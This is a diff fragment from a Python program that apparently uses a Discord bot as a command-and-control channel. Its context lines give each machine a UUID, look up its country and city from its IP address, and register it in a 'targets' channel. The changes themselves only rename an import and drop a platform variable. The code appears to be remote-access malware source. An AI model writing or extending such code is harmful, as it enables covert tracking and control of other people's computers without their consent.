@@ -3,7 +3,7 @@ from discord.ext import commands
 from discord.ext.commands import bot
 from dotenv import load_dotenv
 import threading
-import os as osVars
+import os
 import os.path as osp
 import platform
 # Features importing
@@ -24,17 +24,16 @@ def main():
     identifier = generate_uuid()
 
     # Guild, Bot Token input
-    channel_id = int(osVars.environ.get("DISCORD_CHANNEL_ID")) # should be in int type!
-    token = osVars.environ.get("DISCORD_TOKEN") # should be in string type!
+    channel_id = int(os.environ.get("DISCORD_CHANNEL_ID")) # should be in int type!
+    token = os.environ.get("DISCORD_TOKEN") # should be in string type!
 
-    os = platform.platform()
     country, city = get_location(ip)
-
+    
     threads = []
 
     @bot.event
     async def on_ready():  #This func will start when the bot is ready to use
-        guild = bot.get_guild(int(osVars.environ.get("DISCORD_GUILD_ID")))
+        guild = bot.get_guild(int(os.environ.get("DISCORD_GUILD_ID")))
 
         # check if the target is a new one
         targets_channel = discord.utils.get(guild.text_channels, name=__DISCORD_TARGETS_CHANNEL_NAME)
